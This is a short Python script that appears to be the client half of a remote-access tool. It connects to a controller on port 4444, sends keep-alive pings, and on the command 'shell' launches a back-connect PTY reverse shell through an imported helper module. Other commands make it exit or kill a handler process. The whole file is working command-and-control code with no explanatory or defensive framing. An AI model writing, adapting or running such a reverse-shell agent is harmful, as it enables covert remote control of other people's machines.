#!/usr/bin/env python
import socket
import os, pty
from time import sleep
import tcp_pty_backconnect

from threading import Thread
from time import sleep

TCP_IP = '127.0.0.1'
TCP_PORT = 4444


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

def ping():
    while True:
        try:
            s.send('ping')
        except:
            os._exit(0)
        sleep(3)

def inpty(argv):
  pty.spawn(argv)

thread = Thread(target = ping)
thread.start()

while True:
    data = s.recv(8192)
    if "shell" in data:
        sleep(1)
        tcp_pty_backconnect.run()
        os._exit(0)
    elif "restart" in data:
        os._exit(0)
    elif "kill" in data:
        inpty(["pkill", "handler.sh"])
        os._exit(0)


